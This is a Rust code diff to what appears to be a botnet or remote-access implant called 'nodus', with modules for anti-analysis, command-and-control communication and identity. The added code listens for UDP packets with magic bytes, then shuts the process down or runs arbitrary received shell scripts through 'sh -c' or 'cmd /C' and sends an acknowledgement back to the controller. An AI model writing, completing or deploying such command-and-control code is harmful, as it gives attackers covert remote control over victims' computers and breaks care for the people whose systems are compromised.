@@ -2,6 +2,7 @@ mod anti_analysis;
 mod c2com;
 mod identity;
 
+use std::net::SocketAddr;
 use tokio::{
     signal,
     sync::mpsc,
@@ -14,6 +15,11 @@ enum Command {
     Heartbeat,
     Shutdown,
 }
+
+const MAGIC_1: u8 = 77;
+const MAGIC_2: u8 = 33;
+const SHUTDOWN_COMMAND_TYPE: u8 = 0;
+const SHELL_SCRIPT_COMMAND_TYPE: u8 = 1;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -94,14 +100,97 @@ async fn worker_loop(mut c2com: C2Com, identity: Identity, mut rx: mpsc::Receive
             },
 
             listen_result = c2com.listen(0) => match listen_result {
-                Ok(Some(data)) => {
-                    println!("received data: {:?}", data);
+                Ok(Some((data, addr))) => {
+                    handle_incoming(&c2com, &data, addr).await;
                 },
                 Ok(None) => {}
                 Err(err) => {
                     eprintln!(" - listen failed. {err}");
                 }
             }
+        }
+    }
+}
+
+async fn handle_incoming(c2com: &C2Com, data: &[u8], from: SocketAddr) {
+    if data.len() < 3 || data[0] != MAGIC_1 || data[1] != MAGIC_2 {
+        eprintln!("cmd!! dropping packet from {from} with bad magic/length.");
+        return;
+    }
+
+    match data[2] {
+        SHUTDOWN_COMMAND_TYPE => {
+            println!("cmd<< received shutdown command from {from}");
+            if let Err(err) = c2com.send_bytes_to(from, b"ACK").await {
+                eprintln!("cmd!! failed to ack shutdown: {err}");
+            }
+
+            // small pause so the udp packet gets flushed before we exit
+            sleep(Duration::from_millis(200)).await;
+            println!("nodus exiting per shutdown command.");
+            std::process::exit(0);
+        }
+        SHELL_SCRIPT_COMMAND_TYPE => {
+            if data.len() < 7 {
+                eprintln!("cmd!! shell command packet too short.");
+                return;
+            }
+
+            let script_len =
+                u32::from_be_bytes([data[3], data[4], data[5], data[6]]) as usize;
+
+            if data.len() < 7 + script_len {
+                eprintln!("cmd!! shell script payload truncated.");
+                return;
+            }
+
+            let script = match std::str::from_utf8(&data[7..7 + script_len]) {
+                Ok(s) => s,
+                Err(err) => {
+                    eprintln!("cmd!! shell script not valid utf-8: {err}");
+                    return;
+                }
+            };
+
+            println!("cmd<< received shell script ({} bytes) from {from}", script_len);
+            execute_shell(script).await;
+
+            if let Err(err) = c2com.send_bytes_to(from, b"ACK").await {
+                eprintln!("cmd!! failed to ack shell script: {err}");
+            }
+        }
+        other => {
+            eprintln!("cmd!! unknown command type: {other} from {from}");
+        }
+    }
+}
+
+async fn execute_shell(script: &str) {
+    let result = if cfg!(windows) {
+        tokio::process::Command::new("cmd")
+            .args(["/C", script])
+            .output()
+            .await
+    } else {
+        tokio::process::Command::new("sh")
+            .args(["-c", script])
+            .output()
+            .await
+    };
+
+    match result {
+        Ok(out) => {
+            println!("cmd-- shell exit: {}", out.status);
+            if !out.stdout.is_empty() {
+                print!("{}", String::from_utf8_lossy(&out.stdout));
+            }
+            
+            if !out.stderr.is_empty() {
+                eprint!("{}", String::from_utf8_lossy(&out.stderr));
+            }
+        }
+        Err(err) => {
+            eprintln!("cmd!! shell execution failed: {err}");
         }
     }
 }
